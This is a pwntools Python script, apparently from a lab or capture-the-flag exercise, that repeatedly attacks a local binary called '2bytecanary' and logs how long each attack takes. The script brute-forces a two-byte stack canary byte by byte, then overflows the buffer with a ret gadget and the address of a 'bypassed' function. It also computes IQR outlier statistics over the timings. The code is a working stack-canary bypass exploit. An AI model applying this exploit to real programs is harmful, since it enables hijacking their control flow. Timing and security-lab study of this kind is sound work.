from pwn import *
from math import *

buf = 8
after_canary = 8
canary_bytes = 2

executable = "2bytecanary"

elf = ELF(f"./{executable}")
final = elf.symbols['bypassed']
ret = ROP(f"{executable}").find_gadget(['ret']).address
print(hex(ret),hex(final))
times = []
total = 0

#exit()

def iqr_sort(arr):
    return arr[2]

while True:
    
    p=process(f"./{executable}")
    p.recv()
    p.sendline(b"3")
    print(p.recv())
    p.close()

    start_time = time.time()
    canary = b""

    for j in range(canary_bytes):
        for i in range(256):
            p=process(f"./{executable}")
            p.recv()
            p.sendline(b"2")
            
            """
            print(p.recvline())
            print(p.recvline())
            print(p.recvline())"""
            p.recvuntil("read:")
            p.send(f"{buf+len(canary)+1}\n")
            #print(buf+len(canary)+1)
            #print(p.recv(), "------------------------------------------------------------------")
            p.recvuntil(b"buffer:")
            #Payload
            
            #print(b"a"*buf + canary + p8(i),"Aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
            p.send(b"a"*buf + canary + chr(i).encode('utf-16')[2:3])
            #p.interactive()
            
            #a = p.recvuntil("buffer:")
            #print(a)
            p.recvline()
            line = p.recv()
            p.close()
            if "Canary did not trip." in str(line):
                canary = canary + chr(i).encode('utf-16')[2:3]

                #print(canary,"WORKS---------------------------------------------------------------------------WORKS")
                #pause(1)
                break
    if canary == b"":
        continue
    p=process(f"./{executable}")
    p.recv()
    p.sendline(b"2")

    p.recvuntil(b"read:")
    p.sendline(f"{buf+after_canary+len(canary)+8+8}")
    p.recvuntil(b"buffer:")
    #Payload
    p.send(b"a"*buf + canary + b"a"*(after_canary) + p64(ret) + p64(final))
    last = p.recvall()
    print(last)
    if b"Final Time" in last:
    #print(p.recvline())
    #print(p.recvline())
    #p.recvuntil(b"Final Time:")


        end_time = time.time()
        delta_time = end_time - start_time
        times.append([start_time,end_time,delta_time,''])
        p.close()
        total+=delta_time
        sort = sorted(times,key=iqr_sort)
        print(sort)
        q1_pos = len(sort)/4
        q1 = (floor(q1_pos) + ceil(q1_pos))/2
        q3_pos = 3*(len(sort)/4)
        q3 = (floor(q3_pos) + ceil(q3_pos))/2
        iqr = q3-q1
        max_delta = q3 + iqr*1.5
        min_delta = q1 - iqr*1.5

        counted = 0

        for delta in times:
            if delta[2] < max_delta and delta[2] > min_delta:
                counted+=1
        
        if counted >= 5:
            break


sort = sorted(times,key=iqr_sort)
q1_pos = len(sort)/4
q1 = (floor(q1_pos) + ceil(q1_pos))/2
q3_pos = 3*(len(sort)/4)
q3 = (floor(q3_pos) + ceil(q3_pos))/2
iqr = q3-q1
max_delta = q3 + iqr*1.5
min_delta = q1 - iqr*1.5
print("\n\n")
for i in range(len(times)):
    if times[i][2] < max_delta and times[i][2]> min_delta:
        times[i][3] = ''
        print(times[i])
    else:
        times[i][3] = 'X'
print("\n\n")
print(times)

try:
    file = open(f"{executable}-canary-test-data.txt","a")
    file.write("Start Time\t\t\tEnd Time\t\t\tDelta Time\t\tOutlier (X)\n")
    ave = 0
    for data in times:
        file.write(f"{data[0]}\t{data[1]}\t{data[2]}\n")
        ave+=data[2]
    file.write(f"Average Delta Time: {ave/5}\n")
    file.close()
except:
    print("Tests must be redone")
